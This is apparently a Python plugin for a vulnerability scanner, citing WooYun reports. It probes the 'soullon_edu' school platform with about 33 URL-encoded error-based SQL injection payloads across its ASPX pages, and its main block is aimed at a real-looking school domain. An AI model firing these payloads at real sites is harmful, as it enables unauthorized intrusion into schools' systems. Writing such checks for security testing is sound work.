#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer: http://www.wooyun.org/bugs/wooyun-2010-0132380, http://www.wooyun.org/bugs/wooyun-2010-0131446

def assign(service, arg):
    if service == "soullon_edu":
        return True, arg

def audit(arg):
    payloads = [
    "public/Newsvideo.aspx?NewID=convert%28int,%27tes%27%2b%27tvul%27%29",
    "PlatFormN/PlatformResouseN/ResourceShow.aspx?fid=349193%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Portal/Index?depId=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "PlatFormN/PlatformResouseN/PaperResourceView.aspx?paperid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "PlatFormN/PlatformResouseN/TopicSearchIndexList.aspx?tid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_ExcellentResource/CSResource.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_FeelingWall/FeelingWallIndex.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/InstitutionEdit.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/StudentOrTeacherIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/ArticleIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/InstitutionGroupIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/InstitutionSpaceResIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/InstitutionIndex.aspx?depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Public/PublicComment4Resource.aspx?targetID=137999%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Public/Video.aspx?FID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "PlatFormN/PlatformResouseN/QuestionSearchAnswerList.aspx?questionID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_AlbumAndPhoto/AlbumAndPhotoUploadPhoto.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_AlbumAndPhoto/AlbumAndPhotoAlbumPhotoIndex.aspx?albumID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/ArticleList.aspx?PageTag=n&page=0&depid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/InstitutionIndexList.aspx?PageTag=n&page=0&depid=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/InstitutionGroupList.aspx?PageTag=n&page=0&depCode=3601010025%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Space/Institution/InstitutionNoticeList.aspx?PageTag=n&page=0&depid=25%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "Public/PublicComment4Resource.aspx?targetID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "PlatForm/PlatformResouse/PIndex.aspx?p_id=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/ClassHomeworkSpace/CHSpace.aspx?&classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_AlbumAndPhoto/AlbumAndPhotoAlbumPhotoList.aspx?albumID=&classID=25%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--" ,
    "ClassSpace/CS_FeelingWall/FeelingWallIndex.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_Index/ClassMasterIntro.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_Index/ClassTeacherList.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_Index/ClassMemberList.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_Index/ClassPhotoShow.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_Index/ClassTimeTable.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
    "ClassSpace/CS_Index/ClassStatInfo.aspx?classID=%27and%20convert%28int,%27tes%27%2b%27tvul%27%29=0--",
     ]
    for payload in payloads:
        code,head,res,errorcode,_url = curl.curl2(arg+payload)
        if 'testvul' in res and code == 500:
            security_hole(arg+payload)
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('soullon_edu', 'http://oa.bh5z.net/')[1])